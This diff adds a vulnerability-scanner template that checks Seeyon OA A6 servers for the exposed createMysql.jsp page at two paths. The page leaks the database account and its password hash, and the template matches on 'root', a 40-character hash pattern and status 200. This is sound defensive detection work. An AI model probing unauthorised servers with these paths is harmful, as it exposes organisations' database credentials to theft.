@@ -1,0 +1,30 @@
+id: seeyon-createmysql-exposure
+name: Seeyon OA A6 createMysql.jsp Database - Information Disclosure
+severity: medium
+confidence: confirmed
+description: Seeyon OA A6 has leaked sensitive database information. An attacker can obtain the database account and password
+  MD5 by accessing a specific URL.
+reference: https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java
+tags:
+- seeyon
+- oa
+- info-leak
+- vuln
+requests:
+- method: GET
+  path: /yyoa/createMysql.jsp
+  matchers: &id001
+  - type: body
+    words:
+    - root</br>
+  - type: regex
+    regex:
+    - '[*][0-zA-Z]{40}</br>'
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /yyoa/ext/createMysql.jsp
+  matchers: *id001
+  condition: and
